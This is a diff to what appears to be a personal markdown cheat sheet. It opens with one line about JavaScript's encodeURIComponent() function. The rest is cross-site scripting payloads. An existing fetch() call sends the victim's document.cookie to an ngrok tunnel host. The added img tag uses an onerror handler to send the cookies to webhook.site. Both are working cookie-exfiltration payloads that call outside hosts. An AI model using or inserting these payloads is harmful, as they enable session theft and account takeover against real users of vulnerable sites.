@@ -25,3 +25,7 @@ The encodeURIComponent() function encodes a URI by replacing each instance of ce
 ```js
 fetch(`https://ae1c-43.ngrok-free.app?${encodeURIComponent(document.cookie)}`, { method: "get", headers: new Headers({ "ngrok-skip-browser-warning": true }) })
 ```
+
+```js
+<img src=x onerror=this.src='https://webhook.site/?c='.concat(document.cookie)>
+```
